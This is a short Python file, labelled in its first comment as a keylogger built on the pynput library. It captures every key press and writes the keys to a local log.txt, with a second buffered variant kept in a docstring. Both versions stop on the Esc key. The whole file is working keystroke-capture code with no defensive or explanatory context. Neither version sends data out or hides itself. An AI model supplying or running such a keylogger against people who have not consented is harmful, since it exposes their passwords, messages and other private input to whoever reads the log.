#keylogger using module- pynput
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    # function
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            #removing space
            k = str(key).replace("'", "")
            f.write(k)

            #every keystroke for readablity
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False
    #stop listener


with Listener(on_press=on_press,
              on_release=on_release) as Listener:
    Listener.join()

"""
import pynput
from pynput.keyboard import Key, Listener
import time

keys = []
buffer_time = 5  # seconds

def on_press(key):
    keys.append(key)

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')
        keys.clear()

def on_release(key):
    if key == Key.esc:
        write_file(keys)  # Write remaining keys before exiting
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    # Write remaining keys after listener stops
    write_file(keys)"""